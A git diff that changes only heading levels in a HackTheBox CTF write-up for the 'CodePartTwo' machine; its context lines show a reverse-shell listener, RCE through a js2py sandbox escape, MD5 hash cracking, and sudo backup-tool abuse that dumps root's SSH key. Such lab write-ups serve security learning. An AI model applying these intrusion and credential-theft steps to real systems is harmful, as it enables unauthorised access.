@@ -5,7 +5,7 @@ tags:
   - writeups
 title: HTB - CodePartTwo
 ---
-### How many open TCP ports are listening on CodePartTwo?
+## How many open TCP ports are listening on CodePartTwo?
 
 The initial enumeration phase involves scanning the target to identify active services:
 
@@ -25,7 +25,7 @@ Nmap done: 1 IP address (1 host up) scanned in 1.41 seconds
 
 ---
 
-### What is the version of the js2py library being used by the application?
+## What is the version of the js2py library being used by the application?
 
 - Open website with port 8000
 - Download app via "DOWNLOAD APP" button
@@ -45,7 +45,7 @@ js2py==0.74
 
 ---
 
-### Which CVE number corresponds to the sandbox escape vulnerability in js2py that the application uses?
+## Which CVE number corresponds to the sandbox escape vulnerability in js2py that the application uses?
 
 A search for sandbox escape vulnerabilities in `js2py 0.74` points to a specific security advisory:
 
@@ -53,9 +53,9 @@ A search for sandbox escape vulnerabilities in `js2py 0.74` points to a specific
 
 ---
 
-### What is the name of the database used by the application?
+## What is the name of the database used by the application?
 
-#### Setup Exploit
+### Setup Exploit
 
 Clone the exploit repository and initialize the Python environment using `uv` to manage dependencies:
 
@@ -71,7 +71,7 @@ Clone the exploit repository and initialize the Python environment using `uv` to
 └─$ uv pip install requests
 ```
 
-#### Netcat Listener
+### Netcat Listener
 
 Prepare a listener to intercept the reverse shell connection:
 
@@ -80,7 +80,7 @@ Prepare a listener to intercept the reverse shell connection:
 └─$ nc -lnvp 4444
 ```
 
-#### Exploit Execution
+### Exploit Execution
 
 Run the exploit targeting the vulnerable `/run_code` endpoint to trigger Remote Code Execution (RCE):
 
@@ -92,7 +92,7 @@ Run the exploit targeting the vulnerable `/run_code` endpoint to trigger Remote 
 [+] Response: {"error":"'NoneType' object is not callable"}
 ```
 
-#### Reverse Shell Access
+### Reverse Shell Access
 
 After the payload executes, upgrade the shell to a full TTY and locate the application's database file:
 
@@ -105,7 +105,7 @@ users.db
 
 ---
 
-### What is the recovered password for the user marco?
+## What is the recovered password for the user marco?
 
 Extract the user password hashes directly from the SQLite database file:
 
@@ -119,7 +119,7 @@ The recovered MD5 hash `649c9d65a206a75f5abe509fe128bce5` for user `marco` can b
 
 ---
 
-### Submit the flag located in the marco user's home directory.
+## Submit the flag located in the marco user's home directory.
 
 Establish an SSH session using the cracked credentials for user `marco`:
 
@@ -132,7 +132,7 @@ marco@codeparttwo:~$ cat user.txt
 
 ---
 
-### What is the full path to the backup utility that the marco user can run as root without a password?
+## What is the full path to the backup utility that the marco user can run as root without a password?
 
 Check the sudo configurations to identify potential privilege escalation vectors:
 
@@ -159,9 +159,9 @@ marco@codeparttwo:~$ cat npbackup.conf
 
 ---
 
-### Submit the flag located in the root user's home directory.
+## Submit the flag located in the root user's home directory.
 
-#### Modify Configuration
+### Modify Configuration
 
 Abuse the backup utility by creating a custom configuration file that targets the `/root` directory:
 
@@ -171,7 +171,7 @@ marco@codeparttwo:~$ vi npbackup1.conf
 # Change target path from /home/app/app/ to /root
 ```
 
-#### Run Backup with Root Privileges
+### Run Backup with Root Privileges
 
 Execute the backup utility using the modified configuration:
 
@@ -182,7 +182,7 @@ marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli -c npbackup1.conf -b -f
 snapshot b6138687 saved
 ```
 
-#### Extract Root SSH Credentials
+### Extract Root SSH Credentials
 
 Since the utility is running as root, it can backup and dump sensitive files like the root SSH private key:
 
@@ -194,7 +194,7 @@ marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli -c npbackup1.conf --dump /
 -----END OPENSSH PRIVATE KEY-----
 ```
 
-#### Final Root Access
+### Final Root Access
 
 Save the dumped key to your local machine, adjust the file permissions, and log in as the root user:
 
